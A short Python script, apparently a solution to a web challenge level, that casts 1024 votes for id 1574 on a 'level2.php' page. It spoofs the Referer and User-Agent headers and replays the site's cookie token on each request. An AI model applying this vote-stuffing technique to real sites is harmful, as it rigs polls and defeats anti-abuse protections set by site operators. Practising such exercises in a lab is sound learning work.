#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu May 28 07:10:33 2020

@author: meco
"""
import requests


header = {'Referer': 'http://158.69.76.135/level2.php',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
                        AppleWebKit/537.36 (KHTML, like Gecko)\
                        Chrome/55.0.2883.87\
                        Safari/537.36'}

cookies = {'HoldTheDoor': '0'}

url = 'http://158.69.76.135/level2.php'
playload = {'id': '1574', 'holdthedoor': 'submit', 'key': '0'}

req = requests.get(url)
for i in range(1024):
    cookies['holdthedoor'] = req.cookies['HoldTheDoor']
    req = requests.post(url, data=playload, cookies=cookies, headers=header)
print('Well done, Voting complete for level 2')
